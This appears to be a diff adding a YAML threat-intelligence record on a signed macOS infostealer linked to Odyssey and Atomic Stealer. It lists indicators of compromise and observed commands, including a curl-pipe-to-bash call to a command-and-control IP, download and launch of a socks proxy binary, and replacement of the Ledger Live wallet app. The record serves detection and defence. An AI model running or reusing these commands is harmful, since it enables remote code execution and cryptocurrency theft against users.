@@ -1,0 +1,65 @@
+description: This report details the analysis of a recently uncovered macOS infostealer
+  variant, likely belonging to the Odyssey Stealer family. The sample utilizes code
+  signing and notarization to evade security controls while employing techniques such
+  as a SwiftUI-based application, dynamic AppleScript payload loading, and a persistent
+  backdoor.
+attribution: Unknown
+malware_families:
+- Odyssey Stealer
+- Atomic Stealer (AMOS)
+TTPs:
+  processes:
+  - Gmeet_updater.app
+  - chmod
+  - sh
+  commandline:
+  - /usr/bin/chmod +x /var/folders/6y/y6cc4s9x77lfp_0dc6crzl8r0000gn/T/CFNetworkDownload_lgg1qR.tmp
+  - /bin/sh /var/folders/6y/y6cc4s9x77lfp_0dc6crzl8r0000gn/T/CFNetworkDownload_lgg1qR.tmp
+  - curl -s http://45.146.130.131/api/v1/bot/repeat/[USERNAME] | bash &
+  - curl -s http://45.146.130.131/api/v1/bot/actions/[BOT_ID]
+  - curl -s http://45.146.130.131/otherassets/socks
+  - chmod +x /tmp/socks
+  - /tmp/socks > /dev/null 2>&1 &
+  - pkill Ledger Live
+  - unzip /tmp/ledger.zip -d /Applications
+  powershell: {}
+  scripting_engine:
+  - AppleScript
+  registry_keys: {}
+  image_load: {}
+  network_connections:
+  - executable: curl
+    destination_address: 45.146.130.131
+    url: http://45.146.130.131/auto
+    port: ''
+  - executable: curl
+    destination_address: 45.146.130.131
+    url: http://45.146.130.131/v1/bot/joinsystem/
+    port: ''
+  - executable: curl
+    destination_address: 45.146.130.131
+    url: http://45.146.130.131/api/v1/bot/actions/[BOT_ID]
+    port: ''
+  - executable: curl
+    destination_address: 45.146.130.131
+    url: http://45.146.130.131/otherassets/ledger.zip
+    port: ''
+  persistence:
+  - LaunchDaemon in /Library/LaunchDaemons/ with a randomly generated name (e.g.,
+    com.{random}.plist)
+  - Hidden files within the users home directory storing configuration details (C2
+    IP, username, bot ID)
+  pipes: {}
+  process_relations: {}
+IOCs:
+- hash: dec750b9d596b14aeab1ed6f6d6d370022443ceceb127e7d2468b903c2d9477a
+- ip: 45.146.130.131
+- url: http://allteching.xyz/auto
+- domain: allteching.xyz
+- url: http://45.146.130.131/log
+- url: http://45.146.130.131/v1/bot/joinsystem/
+- url: http://45.146.130.131/api/v1/bot/actions/[BOT_ID]
+- url: http://45.146.130.131/otherassets/ledger.zip
+reference: https://www.jamf.com/blog/signed-and-stealing-uncovering-new-insights-on-odyssey-infostealer/
+date_of_publication: July 18, 2025
+file_creation_date: July 18, 2025
